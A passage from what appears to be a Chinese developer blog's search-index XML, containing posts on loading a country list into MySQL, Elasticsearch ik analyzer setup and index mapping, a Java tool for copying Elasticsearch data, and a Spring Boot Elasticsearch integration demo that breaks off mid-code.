value=&quot;CK&quot;&gt;库可群岛&lt;/option&gt; &lt;option value=&quot;CW&quot;&gt;库拉索&lt;/option&gt; &lt;option value=&quot;LV&quot;&gt;拉脱维亚&lt;/option&gt; &lt;option value=&quot;LS&quot;&gt;莱索托&lt;/option&gt; &lt;option value=&quot;LA&quot;&gt;老挝&lt;/option&gt; &lt;option value=&quot;LB&quot;&gt;黎巴嫩&lt;/option&gt; &lt;option value=&quot;LT&quot;&gt;立陶宛&lt;/option&gt; &lt;option value=&quot;LR&quot;&gt;利比里亚&lt;/option&gt; &lt;option value=&quot;LY&quot;&gt;利比亚&lt;/option&gt; &lt;option value=&quot;LI&quot;&gt;列支敦士登&lt;/option&gt; &lt;option value=&quot;RE&quot;&gt;留尼汪岛&lt;/option&gt; &lt;option value=&quot;LU&quot;&gt;卢森堡&lt;/option&gt; &lt;option value=&quot;RW&quot;&gt;卢旺达&lt;/option&gt; &lt;option value=&quot;RO&quot;&gt;罗马尼亚&lt;/option&gt; &lt;option value=&quot;MG&quot;&gt;马达加斯加&lt;/option&gt; &lt;option value=&quot;IM&quot;&gt;马恩岛&lt;/option&gt; &lt;option value=&quot;MV&quot;&gt;马尔代夫&lt;/option&gt; &lt;option value=&quot;MT&quot;&gt;马耳他&lt;/option&gt; &lt;option value=&quot;MW&quot;&gt;马拉维&lt;/option&gt; &lt;option value=&quot;MY&quot;&gt;马来西亚&lt;/option&gt; &lt;option value=&quot;ML&quot;&gt;马里&lt;/option&gt; &lt;option value=&quot;MK&quot;&gt;马其顿, 前南斯拉夫共和国&lt;/option&gt; &lt;option value=&quot;MH&quot;&gt;马绍尔群岛&lt;/option&gt; &lt;option value=&quot;MQ&quot;&gt;马提尼克岛&lt;/option&gt; &lt;option value=&quot;YT&quot;&gt;马约特岛&lt;/option&gt; &lt;option value=&quot;MU&quot;&gt;毛里求斯&lt;/option&gt; &lt;option value=&quot;MR&quot;&gt;毛利塔尼亚&lt;/option&gt; &lt;option value=&quot;US&quot;&gt;美国&lt;/option&gt; &lt;option value=&quot;AS&quot;&gt;美属萨摩亚&lt;/option&gt; &lt;option value=&quot;UM&quot;&gt;美属外岛&lt;/option&gt; &lt;option value=&quot;VI&quot;&gt;美属维尔京群岛&lt;/option&gt; &lt;option value=&quot;MN&quot;&gt;蒙古&lt;/option&gt; &lt;option value=&quot;MS&quot;&gt;蒙特塞拉特&lt;/option&gt; &lt;option value=&quot;BD&quot;&gt;孟加拉国&lt;/option&gt; &lt;option value=&quot;PE&quot;&gt;秘鲁&lt;/option&gt; &lt;option value=&quot;FM&quot;&gt;密克罗尼西亚&lt;/option&gt; &lt;option value=&quot;MM&quot;&gt;缅甸&lt;/option&gt; &lt;option value=&quot;MD&quot;&gt;摩尔多瓦&lt;/option&gt; &lt;option value=&quot;MA&quot;&gt;摩洛哥&lt;/option&gt; &lt;option value=&quot;MC&quot;&gt;摩纳哥&lt;/option&gt; &lt;option value=&quot;MZ&quot;&gt;莫桑比克&lt;/option&gt; &lt;option value=&quot;MX&quot;&gt;墨西哥&lt;/option&gt; &lt;option value=&quot;NA&quot;&gt;纳米比亚&lt;/option&gt; &lt;option value=&quot;ZA&quot;&gt;南非&lt;/option&gt; &lt;option value=&quot;AQ&quot;&gt;南极洲&lt;/option&gt; &lt;option value=&quot;GS&quot;&gt;南乔治亚和南德桑威奇群岛&lt;/option&gt; &lt;option value=&quot;NR&quot;&gt;瑙鲁&lt;/option&gt; &lt;option value=&quot;NP&quot;&gt;尼泊尔&lt;/option&gt; &lt;option value=&quot;NI&quot;&gt;尼加拉瓜&lt;/option&gt; &lt;option value=&quot;NE&quot;&gt;尼日尔&lt;/option&gt; &lt;option value=&quot;NG&quot;&gt;尼日利亚&lt;/option&gt; &lt;option value=&quot;NU&quot;&gt;纽埃&lt;/option&gt; &lt;option value=&quot;NO&quot;&gt;挪威&lt;/option&gt; &lt;option value=&quot;NF&quot;&gt;诺福克岛&lt;/option&gt; &lt;option value=&quot;PW&quot;&gt;帕劳群岛&lt;/option&gt; &lt;option value=&quot;PN&quot;&gt;皮特凯恩群岛&lt;/option&gt; &lt;option value=&quot;PT&quot;&gt;葡萄牙&lt;/option&gt; &lt;option value=&quot;JP&quot;&gt;日本&lt;/option&gt; &lt;option value=&quot;SE&quot;&gt;瑞典&lt;/option&gt; &lt;option value=&quot;CH&quot;&gt;瑞士&lt;/option&gt; &lt;option value=&quot;SV&quot;&gt;萨尔瓦多&lt;/option&gt; &lt;option value=&quot;WS&quot;&gt;萨摩亚&lt;/option&gt; &lt;option value=&quot;RS&quot;&gt;塞尔维亚共和国&lt;/option&gt; &lt;option value=&quot;SL&quot;&gt;塞拉利昂&lt;/option&gt; &lt;option value=&quot;SN&quot;&gt;塞内加尔&lt;/option&gt; &lt;option value=&quot;CY&quot;&gt;塞浦路斯&lt;/option&gt; &lt;option value=&quot;SC&quot;&gt;塞舌尔&lt;/option&gt; &lt;option value=&quot;XS&quot;&gt;沙巴岛&lt;/option&gt; &lt;option value=&quot;SA&quot;&gt;沙特阿拉伯&lt;/option&gt; &lt;option value=&quot;BL&quot;&gt;圣巴泰勒米岛&lt;/option&gt; &lt;option value=&quot;CX&quot;&gt;圣诞岛&lt;/option&gt; &lt;option value=&quot;ST&quot;&gt;圣多美和普林西比&lt;/option&gt; &lt;option value=&quot;SH&quot;&gt;圣赫勒拿岛&lt;/option&gt; &lt;option value=&quot;KN&quot;&gt;圣基茨和尼维斯&lt;/option&gt; &lt;option value=&quot;LC&quot;&gt;圣卢西亚&lt;/option&gt; &lt;option value=&quot;MF&quot;&gt;圣马丁岛&lt;/option&gt; &lt;option value=&quot;SX&quot;&gt;圣马丁岛&lt;/option&gt; &lt;option value=&quot;SM&quot;&gt;圣马力诺&lt;/option&gt; &lt;option value=&quot;PM&quot;&gt;圣皮埃尔岛和密克隆岛&lt;/option&gt; &lt;option value=&quot;VC&quot;&gt;圣文森特和格林纳丁斯&lt;/option&gt; &lt;option value=&quot;XE&quot;&gt;圣尤斯特歇斯岛&lt;/option&gt; &lt;option value=&quot;LK&quot;&gt;斯里兰卡&lt;/option&gt; &lt;option value=&quot;SK&quot;&gt;斯洛伐克&lt;/option&gt; &lt;option value=&quot;SI&quot;&gt;斯洛文尼亚&lt;/option&gt; &lt;option value=&quot;SZ&quot;&gt;斯威士兰&lt;/option&gt; &lt;option value=&quot;SD&quot;&gt;苏丹&lt;/option&gt; &lt;option value=&quot;SR&quot;&gt;苏里南&lt;/option&gt; &lt;option value=&quot;SB&quot;&gt;所罗门群岛&lt;/option&gt; &lt;option value=&quot;SO&quot;&gt;索马里&lt;/option&gt; &lt;option value=&quot;TJ&quot;&gt;塔吉克斯坦&lt;/option&gt; &lt;option value=&quot;TW&quot;&gt;台湾&lt;/option&gt; &lt;option value=&quot;TH&quot;&gt;泰国&lt;/option&gt; &lt;option value=&quot;TZ&quot;&gt;坦桑尼亚&lt;/option&gt; &lt;option value=&quot;TO&quot;&gt;汤加&lt;/option&gt; &lt;option value=&quot;TC&quot;&gt;特克斯和凯科斯群岛&lt;/option&gt; &lt;option value=&quot;TT&quot;&gt;特立尼达和多巴哥&lt;/option&gt; &lt;option value=&quot;TN&quot;&gt;突尼斯&lt;/option&gt; &lt;option value=&quot;TV&quot;&gt;图瓦卢&lt;/option&gt; &lt;option value=&quot;TR&quot;&gt;土耳其&lt;/option&gt; &lt;option value=&quot;TM&quot;&gt;土库曼斯坦&lt;/option&gt; &lt;option value=&quot;TK&quot;&gt;托克劳&lt;/option&gt; &lt;option value=&quot;WF&quot;&gt;瓦利斯和富图纳&lt;/option&gt; &lt;option value=&quot;VU&quot;&gt;瓦努阿图&lt;/option&gt; &lt;option value=&quot;GT&quot;&gt;危地马拉&lt;/option&gt; &lt;option value=&quot;VG&quot;&gt;维尔京群岛(英属)&lt;/option&gt; &lt;option value=&quot;VE&quot;&gt;委内瑞拉&lt;/option&gt; &lt;option value=&quot;BN&quot;&gt;文莱&lt;/option&gt; &lt;option value=&quot;UG&quot;&gt;乌干达&lt;/option&gt; &lt;option value=&quot;UA&quot;&gt;乌克兰&lt;/option&gt; &lt;option value=&quot;UY&quot;&gt;乌拉圭&lt;/option&gt; &lt;option value=&quot;UZ&quot;&gt;乌兹别克斯坦&lt;/option&gt; &lt;option value=&quot;ES&quot;&gt;西班牙&lt;/option&gt; &lt;option value=&quot;GR&quot;&gt;希腊&lt;/option&gt; &lt;option value=&quot;HK&quot;&gt;香港特别行政区&lt;/option&gt; &lt;option value=&quot;SG&quot;&gt;新加坡&lt;/option&gt; &lt;option value=&quot;NC&quot;&gt;新喀里多尼亚&lt;/option&gt; &lt;option value=&quot;NZ&quot;&gt;新西兰&lt;/option&gt; &lt;option value=&quot;HU&quot;&gt;匈牙利&lt;/option&gt; &lt;option value=&quot;SY&quot;&gt;叙利亚&lt;/option&gt; &lt;option value=&quot;JM&quot;&gt;牙买加&lt;/option&gt; &lt;option value=&quot;AM&quot;&gt;亚美尼亚&lt;/option&gt; &lt;option value=&quot;SJ&quot;&gt;扬马延岛&lt;/option&gt; &lt;option value=&quot;YE&quot;&gt;也门&lt;/option&gt; &lt;option value=&quot;IQ&quot;&gt;伊拉克&lt;/option&gt; &lt;option value=&quot;IR&quot;&gt;伊朗&lt;/option&gt; &lt;option value=&quot;IL&quot;&gt;以色列&lt;/option&gt; &lt;option value=&quot;IT&quot;&gt;意大利&lt;/option&gt; &lt;option value=&quot;IN&quot;&gt;印度&lt;/option&gt; &lt;option value=&quot;ID&quot;&gt;印度尼西亚&lt;/option&gt; &lt;option value=&quot;UK&quot;&gt;英国&lt;/option&gt; &lt;option value=&quot;IO&quot;&gt;英属印度洋领地&lt;/option&gt; &lt;option value=&quot;JO&quot;&gt;约旦&lt;/option&gt; &lt;option value=&quot;VN&quot;&gt;越南&lt;/option&gt; &lt;option value=&quot;ZM&quot;&gt;赞比亚&lt;/option&gt; &lt;option value=&quot;JE&quot;&gt;泽西&lt;/option&gt; &lt;option value=&quot;TD&quot;&gt;乍得&lt;/option&gt; &lt;option value=&quot;GI&quot;&gt;直布罗陀&lt;/option&gt; &lt;option value=&quot;CL&quot;&gt;智利&lt;/option&gt; &lt;option value=&quot;CF&quot;&gt;中非共和国&lt;/option&gt; &lt;option value=&quot;CN&quot;&gt;中国&lt;/option&gt; &lt;/select&gt; 2、表结构 3、运行命令：123LOAD XML LOCAL INFILE &apos;f:\address.xml&apos;INTO TABLE addressROWS IDENTIFIED BY &apos;&lt;option&gt;&apos;; 参考：https://dev.mysql.com/doc/refman/5.5/en/load-xml.html]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ElasticSearch 创建ik 索引]]></title>
    <url>%2Fblog%2F2017%2F12%2F12%2FElasticSearch%20%E5%88%9B%E5%BB%BAik%20%E7%B4%A2%E5%BC%95%2F</url>
    <content type="text"><![CDATA[简单粗暴，代码如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&#123; &quot;setting&quot;:&#123; &quot;number_of_shards&quot;:5, &quot;number_of_replicas&quot;:1 &#125;, &quot;mappings&quot;:&#123; &quot;brain&quot;:&#123; &quot;properties&quot;:&#123; &quot;answer&quot;:&#123; &quot;type&quot;:&quot;text&quot;, &quot;analyzer&quot;:&quot;ik_max_word&quot;, &quot;search_analyzer&quot;:&quot;ik_smart&quot; &#125;, &quot;question&quot;:&#123; &quot;type&quot;:&quot;text&quot;, &quot;analyzer&quot;:&quot;ik_max_word&quot;, &quot;search_analyzer&quot;:&quot;ik_smart&quot; &#125;, &quot;user_id&quot;:&#123; &quot;type&quot;:&quot;text&quot; &#125;, &quot;create_time&quot;:&#123; &quot;type&quot;:&quot;date&quot;, &quot;format&quot;:&quot;yyyy-MM-dd HH:mm:ss || yyyy-MM-dd || epoch_millis&quot; &#125; &#125; &#125;, &quot;history&quot;:&#123; &quot;properties&quot;:&#123; &quot;question&quot;:&#123; &quot;type&quot;:&quot;text&quot;, &quot;analyzer&quot;:&quot;ik_max_word&quot;, &quot;search_analyzer&quot;:&quot;ik_smart&quot; &#125;, &quot;user_id&quot;:&#123; &quot;type&quot;:&quot;text&quot; &#125;, &quot;address&quot;:&#123; &quot;type&quot;:&quot;text&quot;, &quot;analyzer&quot;:&quot;ik_max_word&quot;, &quot;search_analyzer&quot;:&quot;ik_smart&quot; &#125;, &quot;is_read&quot;:&#123; &quot;type&quot;:&quot;text&quot; &#125;, &quot;create_time&quot;:&#123; &quot;type&quot;:&quot;date&quot;, &quot;format&quot;:&quot;yyyy-MM-dd HH:mm:ss || yyyy-MM-dd || epoch_millis&quot; &#125; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch安装中文分词插件ik]]></title>
    <url>%2Fblog%2F2017%2F12%2F11%2FElasticsearch%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8F%92%E4%BB%B6ik%2F</url>
    <content type="text"><![CDATA[Elasticsearch安装中文分词插件ik为了做搜索弄了一个星期，还是没有搜索到自己想要的内容。虽说各种查询都懂一点，但是就是查不到自己想要的。那是以为我用的是默认的标准分词器。对中文来说不是很好，它把中文拆成一个一个的。然后我就各种论坛，各种博客，各种学习网站。然后发现有这么一个ik中文分词的东西。然后我就试着使用了一下，发现确实一些基本的查询都搞定了。一个星期的问题，其实装个插件就搞定了。有点小郁闷。一、Windows 安装ik插件1、下载地址：https://github.com/medcl/elasticsearch-analysis-ik下载你对应的版本 2、解压把下载的文件，解压 3、在elasticsearch 的plugins 目录下，新建一个名为：ik 的文件夹，把上面解压的东西放到ik文件内 4、重启elasticsearch二、Linux 安装ik插件操作和windows 的操作一样。。。。。。]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch 数据导入导出 Java 实现工具类]]></title>
    <url>%2Fblog%2F2017%2F12%2F11%2FElasticsearch%20%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%20Java%20%E5%AE%9E%E7%8E%B0%E5%B7%A5%E5%85%B7%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Elasticsearch 数据导入导出 Java 实现最近学了elasticsearch 对它也不是非常的熟悉，它好像没有像 mongodb 有mongodump 这样的工具方便。虽然也有一些别人做的插件工具。但嫌麻烦，所以整理了网上一些大神写代码。工具类如下。如果发现有不对的地方，欢迎指正。或者可以优化的地方，欢迎指点。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226package top.lrshuai.blog.util;import java.io.BufferedReader;import java.io.BufferedWriter;import java.io.FileNotFoundException;import java.io.FileReader;import java.io.FileWriter;import java.io.IOException;import java.net.InetSocketAddress;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import org.elasticsearch.action.bulk.BulkRequestBuilder;import org.elasticsearch.action.index.IndexRequest;import org.elasticsearch.action.search.SearchRequestBuilder;import org.elasticsearch.action.search.SearchResponse;import org.elasticsearch.client.transport.TransportClient;import org.elasticsearch.common.settings.Settings;import org.elasticsearch.common.transport.InetSocketTransportAddress;import org.elasticsearch.common.unit.TimeValue;import org.elasticsearch.index.query.QueryBuilders;import org.elasticsearch.search.SearchHit;import org.elasticsearch.transport.client.PreBuiltTransportClient;/** * * @author rstyro * */public class CopyUtil &#123; public static void main(String[] args) throws Exception &#123; String srcClustName=&quot;robot&quot;; String srcIndexName=&quot;robot4&quot;; String srcIp=&quot;127.0.0.1&quot;; int srcPort = 9300; String tagClustName=&quot;robot&quot;; String tagIndexName=&quot;robot6&quot;; String tagTypeName=&quot;brain&quot;; String tagIp=&quot;127.0.0.1&quot;; int tagPort = 9300; esToEs(srcClustName, srcIndexName, srcIp, srcPort, tagClustName, tagIndexName, tagTypeName, tagIp, tagPort); //outToFile(srcClustName, srcIndexName, null, srcIp, srcPort, &quot;f:\\json.txt&quot;); //fileToEs(tagClustName, tagIndexName, tagTypeName, tagIp, tagPort, &quot;f:\\json.txt&quot;); &#125; /** * 数据拷贝 * elasticsearch 到 elasticsearch * @param srcClustName 原集群名称 * @param srcIndexName 原索引 * @param srcIp 原ip * @param srcPort 原 transport 服务端口(默认9300的端口) * @param tagClustName 目标集群名称 * @param tagIndexName 目标索引 * @param tagTypeName 目标type * @param tagIp 目标ip * @param tagPort 目标transport服务端口 * @throws InterruptedException */ public static void esToEs(String srcClustName,String srcIndexName,String srcIp,int srcPort,String tagClustName,String tagIndexName,String tagTypeName,String tagIp,int tagPort) throws InterruptedException&#123; Settings srcSettings = Settings.builder() .put(&quot;cluster.name&quot;, srcClustName) // .put(&quot;client.transport.sniff&quot;, true) //.put(&quot;client.transport.ping_timeout&quot;, &quot;30s&quot;) //.put(&quot;client.transport.nodes_sampler_interval&quot;, &quot;30s&quot;) .build(); TransportClient srcClient = new PreBuiltTransportClient(srcSettings); srcClient.addTransportAddress(new InetSocketTransportAddress(new InetSocketAddress(srcIp, srcPort))); Settings tagSettings = Settings.builder() .put(&quot;cluster.name&quot;, tagClustName) //.put(&quot;client.transport.sniff&quot;, true) // .put(&quot;client.transport.ping_timeout&quot;, &quot;30s&quot;) // .put(&quot;client.transport.nodes_sampler_interval&quot;, &quot;30s&quot;) .build(); TransportClient tagClient = new PreBuiltTransportClient(tagSettings); tagClient.addTransportAddress(new InetSocketTransportAddress(new InetSocketAddress(tagIp, tagPort))); SearchResponse scrollResp = srcClient.prepareSearch(srcIndexName) .setScroll(new TimeValue(1000)) .setSize(1000) .execute().actionGet(); BulkRequestBuilder bulk = tagClient.prepareBulk(); ExecutorService executor = Executors.newFixedThreadPool(5); while(true)&#123; bulk = tagClient.prepareBulk(); final BulkRequestBuilder bulk_new = bulk; System.out.println(&quot;查询条数=&quot;+scrollResp.getHits().getHits().length); for(SearchHit hit : scrollResp.getHits().getHits())&#123; IndexRequest req = tagClient.prepareIndex().setIndex(tagIndexName) .setType(tagTypeName).setSource(hit.getSourceAsMap()).request(); bulk_new.add(req); &#125; executor.execute(new Runnable() &#123; @Override public void run() &#123; bulk_new.execute(); &#125; &#125;); Thread.sleep(100); scrollResp = srcClient.prepareSearchScroll(scrollResp.getScrollId()) .setScroll(new TimeValue(1000)).execute().actionGet(); if(scrollResp.getHits().getHits().length == 0)&#123; break; &#125; &#125; //该方法在加入线程队列的线程执行完之前不会执行 executor.shutdown(); System.out.println(&quot;执行结束&quot;); tagClient.close(); srcClient.close(); &#125; /** * elasticsearch 数据到文件 * @param clustName 集群名称 * @param indexName 索引名称 * @param typeName type名称 * @param sourceIp ip * @param sourcePort transport 服务端口 * @param filePath 生成的文件路径 */ public static void outToFile(String clustName,String indexName,String typeName,String sourceIp,int sourcePort,String filePath)&#123; Settings settings = Settings.builder() .put(&quot;cluster.name&quot;, clustName) //.put(&quot;client.transport.sniff&quot;, true) // .put(&quot;client.transport.ping_timeout&quot;, &quot;30s&quot;) // .put(&quot;client.transport.nodes_sampler_interval&quot;, &quot;30s&quot;) .build(); TransportClient client = new PreBuiltTransportClient(settings); client.addTransportAddress(new InetSocketTransportAddress(new InetSocketAddress(sourceIp, sourcePort))); SearchRequestBuilder builder = client.prepareSearch(indexName); if(typeName != null)&#123; builder.setTypes(typeName); &#125; builder.setQuery(QueryBuilders.matchAllQuery()); builder.setSize(10000); builder.setScroll(new TimeValue(6000)); SearchResponse scrollResp = builder.execute().actionGet(); try &#123; //把导出的结果以JSON的格式写到文件里 BufferedWriter out = new BufferedWriter(new FileWriter(filePath, true)); long count = 0; while (true) &#123; for(SearchHit hit : scrollResp.getHits().getHits())&#123; String json = hit.getSourceAsString(); if(!json.isEmpty() &amp;&amp; !&quot;&quot;.equals(json))&#123; out.write(json); out.write(&quot;\r\n&quot;); count++; &#125; &#125; scrollResp = client.prepareSearchScroll(scrollResp.getScrollId()) .setScroll(new TimeValue(6000)).execute().actionGet(); if(scrollResp.getHits().getHits().length == 0)&#123; break; &#125; &#125; System.out.println(&quot;总共写入数据:&quot;+count); out.close(); client.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; /** * 把json 格式的文件导入到elasticsearch 服务器 * @param clustName 集群名称 * @param indexName 索引名称 * @param typeName type 名称 * @param sourceIp ip * @param sourcePort 端口 * @param filePath json格式的文件路径 */ @SuppressWarnings(&quot;deprecation&quot;) public static void fileToEs(String clustName,String indexName,String typeName,String sourceIp,int sourcePort,String filePath)&#123; Settings settings = Settings.builder() .put(&quot;cluster.name&quot;, clustName) //.put(&quot;client.transport.sniff&quot;, true) //.put(&quot;client.transport.ping_timeout&quot;, &quot;30s&quot;) //.put(&quot;client.transport.nodes_sampler_interval&quot;, &quot;30s&quot;) .build(); TransportClient client = new PreBuiltTransportClient(settings); client.addTransportAddress(new InetSocketTransportAddress(new InetSocketAddress(sourceIp, sourcePort))); try &#123; //把导出的结果以JSON的格式写到文件里 BufferedReader br = new BufferedReader(new FileReader(filePath)); String json = null; int count = 0; //开启批量插入 BulkRequestBuilder bulkRequest = client.prepareBulk(); while ((json = br.readLine()) != null) &#123; bulkRequest.add(client.prepareIndex(indexName, typeName).setSource(json)); //每一千条提交一次 count++;// if (count% 1000==0) &#123;// System.out.println(&quot;提交了1000条&quot;);// BulkResponse bulkResponse = bulkRequest.execute().actionGet();// if (bulkResponse.hasFailures()) &#123;// System.out.println(&quot;message:&quot;+bulkResponse.buildFailureMessage());// &#125;// //重新创建一个bulk// bulkRequest = client.prepareBulk();// &#125; &#125; bulkRequest.execute().actionGet(); System.out.println(&quot;总提交了：&quot; + count); br.close(); client.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125;]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (十二)与 Elasticsearch 整合]]></title>
    <url>%2Fblog%2F2017%2F12%2F02%2FSpring%20Boot%20(%E5%8D%81%E4%BA%8C)%E4%B8%8E%20Elasticsearch%20%E6%95%B4%E5%90%88%2F</url>
    <content type="text"><![CDATA[Springboot 与 elasticsearch 整合demospringboot 整合elasticsearch5.6.4 版本的 一、pom.xmlpom.xml 主要片段1234567891011121314151617181920212223&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;elasticsearch.version&gt;5.6.4&lt;/elasticsearch.version&gt;&lt;/properties&gt;&lt;!-- 接口注解需要用到 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- 重要 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt; &lt;artifactId&gt;transport&lt;/artifactId&gt; &lt;version&gt;$&#123;elasticsearch.version&#125;&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 需要 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;&lt;/dependency&gt; 二、application.properties 内容1234# 你集群的名字elasticsearch.cluster.name=people# 地址，多个用逗号隔开，注意端口，9300 是transportService 的端口。elasticsearch.host=127.0.0.1:9300,127.0.0.1:9301 三、自定义Elasticsearch 配置类这个配置类是为了获取TransportClient123456789101112131415161718192021222324252627282930313233343536373839404142package top.lrshuai.es.config;import org.elasticsearch.client.transport.TransportClient;import org.elasticsearch.common.settings.Settings;import org.elasticsearch.common.transport.InetSocketTransportAddress;import org.elasticsearch.transport.client.PreBuiltTransportClient;import org.springframework.beans.factory.annotation.Value;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import java.net.InetAddress;import java.net.UnknownHostException;@Configurationpublic class ElasticsearchConfig &#123; @Value(&quot;$&#123;elasticsearch.cluster.name&#125;&quot;) private String clusterName; @Value(&quot;$&#123;elasticsearch.host&#125;&quot;) private String host; @Bean public TransportClient transportClient() throws UnknownHostException &#123; // 设置集群名称 Settings settings = Settings.builder().put(&quot;cluster.name&quot;, clusterName) .build(); TransportClient transportClient = new PreBuiltTransportClient(settings); String[] nodes = host.split(&quot;,&quot;); for (String node : nodes) &#123; if (node.length() &gt; 0) &#123; String[] hostPort = node.split(&quot;:&quot;); transportClient.addTransportAddress( new InetSocketTransportAddress( InetAddress.getByName(hostPort[0]), Integer.parseInt(hostPort[1]))); &#125; &#125; return transportClient; &#125;&#125; 四、自定义查询的接口与实现下面是我的一个例子，可以参考下，然后按照自己的需求定制查询接口 1、PersonDao 接口123456789101112package top.lrshuai.es.dao;import top.lrshuai.es.entity.Person;public interface PersonDao &#123; public String save(Person person); public String update(Person person); public String deltele(String id); public Object find(String id); public Object query(Person person);&#125; 2、PersonDaoImpl 接口的实现类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160package top.lrshuai.es.dao.impl;import java.io.IOException;import java.util.ArrayList;import java.util.List;import java.util.Map;import java.util.concurrent.ExecutionException;import org.apache.log4j.Logger;import org.elasticsearch.action.delete.DeleteResponse;import org.elasticsearch.action.get.GetResponse;import org.elasticsearch.action.index.IndexResponse;import org.elasticsearch.action.search.SearchRequestBuilder;import org.elasticsearch.action.search.SearchResponse;import org.elasticsearch.action.search.SearchType;import org.elasticsearch.action.update.UpdateRequest;import org.elasticsearch.action.update.UpdateResponse;import org.elasticsearch.client.transport.TransportClient;import org.elasticsearch.common.xcontent.XContentBuilder;import org.elasticsearch.common.xcontent.XContentFactory;import org.elasticsearch.index.query.BoolQueryBuilder;import org.elasticsearch.index.query.QueryBuilders;import org.elasticsearch.index.query.RangeQueryBuilder;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Component;import top.lrshuai.es.dao.PersonDao;import top.lrshuai.es.entity.Person;@Componentpublic class PersonDaoImpl implements PersonDao&#123; @Autowired private TransportClient transportClient; private Logger log = Logger.getLogger(getClass()); //索引名称（数据库名） private String index = &quot;test&quot;; //类型名称（表名） private String type = &quot;person&quot;; /** * 保存 */ @Override public String save(Person person) &#123; try &#123; XContentBuilder builder = XContentFactory.jsonBuilder().startObject(); builder.field(&quot;name&quot;, person.getName()); builder.field(&quot;age&quot;, person.getAge()); builder.field(&quot;sex&quot;, person.getSex()); builder.field(&quot;birthday&quot;, person.getBirthday()); builder.field(&quot;introduce&quot;, person.getIntroduce()); builder.endObject(); IndexResponse response = this.transportClient.prepareIndex(index, type) .setSource(builder).get(); return response.getId(); &#125; catch (IOException e) &#123; e.printStackTrace(); log.error(e.getMessage(), e); &#125; return null; &#125; /** * 更新 */ @Override public String update(Person person) &#123; UpdateRequest request = new UpdateRequest(index, type, person.getId()); try &#123; XContentBuilder builder = XContentFactory.jsonBuilder().startObject(); if (person.getName() != null) &#123; builder.field(&quot;name&quot;, person.getName()); &#125; if (person.getSex() != null) &#123; builder.field(&quot;sex&quot;, person.getSex()); &#125; if (person.getIntroduce() != null) &#123; builder.field(&quot;introduce&quot;, person.getIntroduce()); &#125; if (person.getBirthday() != null) &#123; builder.field(&quot;birthday&quot;, person.getBirthday()); &#125; if (person.getAge() &gt; 0) &#123; builder.field(&quot;age&quot;, person.getAge()); &#125; builder.endObject(); request.doc(builder); UpdateResponse response = transportClient.update(request).get(); return response.getId(); &#125; catch (IOException | InterruptedException | ExecutionException e) &#123; log.error(e.getMessage(), e); &#125; return null; &#125; @Override public String deltele(String id) &#123; DeleteResponse response = transportClient.prepareDelete(index, type, id).get(); return response.getId(); &#125; @Override public Object find(String id) &#123; GetResponse response =transportClient.prepareGet(index, type, id).get(); System.out.println(&quot;response=&quot;+response); Map&lt;String, Object&gt; result = response.getSource(); if(result != null) &#123; result.put(&quot;_id&quot;, response.getId()); &#125; return result; &#125; @Override public Object query(Person person) &#123; List&lt;Map&lt;String,Object&gt;&gt; result = new ArrayList&lt;&gt;();; try &#123; BoolQueryBuilder boolBuilder = QueryBuilders.boolQuery(); if (person.getName() != null) &#123;// boolBuilder.must(QueryBuilders.matchQuery(&quot;name&quot;, person.getName())); boolBuilder.should(QueryBuilders.matchQuery(&quot;name&quot;, person.getName())); &#125; if (person.getIntroduce() != null) &#123;// boolBuilder.must(QueryBuilders.matchQuery(&quot;introduce&quot;, person.getIntroduce())); boolBuilder.should(QueryBuilders.matchQuery(&quot;introduce&quot;, person.getIntroduce())); &#125; //range 查询范围，大于age,小于age+10 if(person.getAge() &gt; 0) &#123; RangeQueryBuilder rangeQuery = QueryBuilders.rangeQuery(&quot;age&quot;); rangeQuery.from(person.getAge()); rangeQuery.to(person.getAge()+10); boolBuilder.filter(rangeQuery); &#125; SearchRequestBuilder builder = transportClient.prepareSearch(index) .setTypes(type) 